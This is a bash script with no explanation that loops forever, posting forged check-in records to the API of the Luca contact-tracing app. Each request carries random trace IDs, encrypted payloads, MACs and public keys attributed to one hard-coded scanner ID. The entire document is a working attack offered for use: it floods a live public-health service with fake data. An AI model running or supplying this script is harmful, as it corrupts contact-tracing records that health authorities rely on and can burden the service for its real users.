#!/bin/bash


SCANNER_ID=54daa036-f41f-40ba-9878-2074950991a0; 

RAND64() { 
dd if=/dev/urandom bs=1 count=$1 2>/dev/null | base64 | tr -d " \r\n"; 
}; 

while true; 
do 
curl -s --output /dev/null 'https://app.luca-app.de/api/v3/trAces/checkin' \
-H 'Content-Type: application/json' \
--data-raw '{"traceId":"'$(RAND64 16)'","scannerId":"'$SCANNER_ID'","timestamp":'$(date +%s)',"data":"'$(RAND64 75)'","iv":"'$(RAND64 16)'","mac":"'$(RAND64 32)'","publicKey":"'$(RAND64 65)'","deviceType":1}'; 
done

